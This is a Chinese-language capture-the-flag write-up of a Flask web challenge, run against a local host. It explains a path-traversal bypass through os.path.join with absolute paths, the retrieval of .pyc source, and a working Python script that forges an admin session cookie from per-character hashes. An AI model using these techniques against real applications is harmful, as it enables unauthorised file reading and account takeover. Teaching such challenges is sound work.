首先访问网页，可以看到界面，hello user和一个超链接。

点击打开新世界大门会打开一个新网页，可以看到一部分源码如下。

```python
import re
import os
http_schema = re.compile(r"https?")
url_parser = re.compile(r"(\w+)://([\w\-@\.:]+)/?([\w/_\-@&\?\.=%()]+)?(#[\w\-@&_\?()/%]+)?")
base_dir = os.path.dirname(os.path.abspath(__file__))
sandbox_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sandbox")
def parse_file(path):
    filename = os.path.join(sandbox_dir, path)
    if "./" in filename or ".." in filename:
        return "invalid content in url"
    if not filename.startswith(base_dir):
        return "url have to start with %s" % base_dir
    if filename.endswith("py") or "flag" in filename:
        return "invalid content in filename"
    if os.path.isdir(filename):
        file_list = os.listdir(filename)
        return ", ".join(file_list)
    elif os.path.isfile(filename):
        with open(filename, "rb") as f:
            content = f.read()
        return content
    else:
        return "can't find file"
def parse(url):
    fragments = url_parser.findall(url)
    if len(fragments) != 1 or len(fragments[0]) != 4:
        return("invalid url")
    schema = fragments[0][0]
    host = fragments[0][1]
    path = fragments[0][2]
    if http_schema.match(schema):
        return "It's a valid http url"
    elif schema == "file":
        if host != "sandbox":
            return "wrong file path"
        return parse_file(path)
    else:
        return "unknown schema"

@app.route('/sandbox')
def render_static():
    url = request.args.get("url")
    try:
        if url is None or url == "":
            content = "no url input"
        else:
            content = parse(url)
        resp = make_response(content)
    except Exception:
        resp = make_response("url error")
    resp.mimetype = "text/plain"
    return resp
```

分析代码可以看出，web接收url参数，并对其进行解析，分类出协议、主机名、路径等信息，如果协议是file时，会尝试解析文件。

关键代码在于`parse_file`函数：

```python
def parse_file(path):
    filename = os.path.join(sandbox_dir, path)
    if "./" in filename or ".." in filename:
        return "invalid content in url"
    if not filename.startswith(base_dir):
        return "url have to start with %s" % base_dir
    if filename.endswith("py") or "flag" in filename:
        return "invalid content in filename"
    if os.path.isdir(filename):
        file_list = os.listdir(filename)
        return ", ".join(file_list)
    elif os.path.isfile(filename):
        with open(filename, "rb") as f:
            content = f.read()
        return content
    else:
        return "can't find file"
```

首先`os.path.join`函数，查看原型`/xxxx/python3.7/posixpath.py`：

```python
# Join pathnames.
# Ignore the previous parts if a part is absolute.
# Insert a '/' unless the first part is empty or already ends in '/'.

def join(a, *p):
    """Join two or more pathname components, inserting '/' as needed.
    If any component is an absolute path, all previous path components
    will be discarded.  An empty last part will result in a path that
    ends with a separator."""
    a = os.fspath(a)
    sep = _get_sep(a)
    path = a
    try:
        if not p:
            path[:0] + sep  #23780: Ensure compatible data type even if p is null.
        for b in map(os.fspath, p):
            if b.startswith(sep):
                path = b
            elif not path or path.endswith(sep):
                path += b
            else:
                path += sep + b
    except (TypeError, AttributeError, BytesWarning):
        genericpath._check_arg_types('join', a, *p)
        raise
    return path
```

可以看出，当`*p`中某参数以分隔符开头时，路径会变成该参数，即对于`os.path.join("/home/xxx/project", "/etc/passwd")`，结果是`/etc/passwd`。

看到这里，我们可以构造任意路径了，继续看代码，下面几行是过滤条件：

```python
    if "./" in filename or ".." in filename:
        return "invalid content in url"
    if not filename.startswith(base_dir):
        return "url have to start with %s" % base_dir
    if filename.endswith("py") or "flag" in filename:
        return "invalid content in filename"
```

首先不允许`./`和`..`的存在，防止跳到上层目录，之后限定了文件名一定要以`base_dir`开头，而base_dir是`base_dir = os.path.dirname(os.path.abspath(__file__))`，接下来呢限定文件不能以`py`结尾且`flag`不出现在文件名中。

之后几行代码会对文件读取，如果是目录就列出目录中文件内容，如果是文件就会返回文件内容，否则返回找不到文件。

综合以上信息，我们只能访问以当前目录的上一层开头，并且不能是python源代码文件，于是很显然我们可以利用pyc文件，再反编译成py文件，进行源代码审计。

查看当前源代码网页url：`http://127.0.0.1:5000/sandbox?url=file://sandbox/1.txt&token=MKqplUet+Z8Mbed1jkwlXmbiO5Pkguhn09OVvwF/S5jZ9nJ4w0abYS5ADGreQd9mGyc/b+6oxcqeskTTgZEU+xqQ/BHAyiwWONd01jW0ONdLSyLOI/fy3sr+lIvGei5ue9wd/XqM9WawN26tpaZ372nitSp6ZONiO1VGFtgwdmoW3hHO0P5piB5IKCoqLKWS`，观察url参数为token和file。token会存在刷新问题，在首页重新打开新世界的大门得到token就可以了。

首先重新打开新世界的大门，之后将url参数内容改为：`file://sandbox//1.txt`，得到`base_dir`:`url have to start with /xxx/project/playground`。

得到`base_dir`后，我们可以拼凑出`file://sandbox/`+`base_dir`，得到文件列表：`flag.py, session.py, __pycache__, parser.py, hash.py, utils.py, sandbox, static, templates, main.py`，之后拼凑出`file://sandbox/`+`base_dir`+`__pycache__`得到pyc文件列表：`parser.cpython-37.pyc, main.cpython-37.pyc, flag.cpython-37.pyc, hash.cpython-37.pyc, utils.cpython-37.pyc, session.cpython-37.pyc`。之后访问这些pyc文件，本地反编译出源码。

分析代码可以看出，当username为admin时，可以获得flag。

```python
from flag import FLAG

if username == "admin":
    content=escape(FLAG)
```

分析session机制可以看出，cookie是储存在客户端的，内容为base32编码后的用户名+hash值。

```python
from hash import MDA
from flag import seed

def encode(info):
    return str(base64.b32encode(bytes(info, 'utf-8')), 'utf-8')

def decode(info):
    return str(base64.b32decode(bytes(info, 'utf-8')), 'utf-8')

def hash_encode(info):
    md = MDA(seed)
    return md.grouping(info)

def hash_verify(hash_info, info):
    return hash_encode(info) == hash_info

def session_encode(info):
    return "%s.%s" % (encode(info), hash_encode(info))
```

下面分析hash算法，如何伪造出admin的哈希值。

关键点在于初始化，从代码可以看出其中关键的ABCD都是由生成的随机数，但是我们并不知道seed。

```python
    def __init__(self, seed="lctf2018"):
        self.seed = seed
        self.init()

    def init(self):
        self.length = 0
        self.count = [0, 0]
        self.input = []
        random.seed(self.seed)
        self.A = random.randint(0x0cfe, 0x6b89)
        self.B = random.randint(0x0cfe, 0x6b89)
        self.C = random.randint(0x0cfe, 0x6b89)
        self.D = random.randint(0x0cfe, 0x6b89)
```

之后是被session.py调用的关键函数，可以看到输入分为单个字母，之后将每个字母的哈希值合并起来输出，而每次获取字母哈希值时都会进行初始化，而初始化时都是使用同一个seed进行初始化，即对于`hash(ab)=hash(a)+hash(b)`,因此虽然我们不知道seed，但是通过多次访问首页得到不同user的哈希值，我们可以拼凑出admin的哈希值。

```python
    def insert(self, inBuf):
        self.init()
        self.update(inBuf)
        
    def grouping(self, inBufGroup):
        hexdigest_group = ""
        for inBuf in inBufGroup:
            self.insert(inBuf)
            hexdigest_group += self.hexdigest()
        return hexdigest_group
```

脚本代码：

```python
import requests
import base64

url = "http://127.0.0.1:5000"

dic = {
    "a": None,
    "d": None,
    "m": None,
    "i": None,
    "n": None,
}

def check_hash():
    global dic
    for key in dic.keys():
        if dic[key] is None:
            return False
    return True

def parse_token(info):
    info_, hash_ = str.split(info, ".")
    username = str(base64.b32decode(bytes(info_, 'utf-8')), 'utf-8')
    for i in range(0, len(username)):
        u = username[i]
        h = hash_[0+16*i:16*i+16]
        if u in dic.keys():
            dic[u] = h

def parse_session():
    return "%s.%s" % (
        str(base64.b32encode(bytes("admin", 'utf-8')), 'utf-8'),
        "".join([dic[n] for n in "admin"]),
    )

def loop():
    while check_hash() is False:
        r = requests.get(url)
        parse_token(r.cookies["user"])
    print(dic)
    r = requests.get(url, cookies={"user": parse_session()})
    print(r.text)
    
loop()
```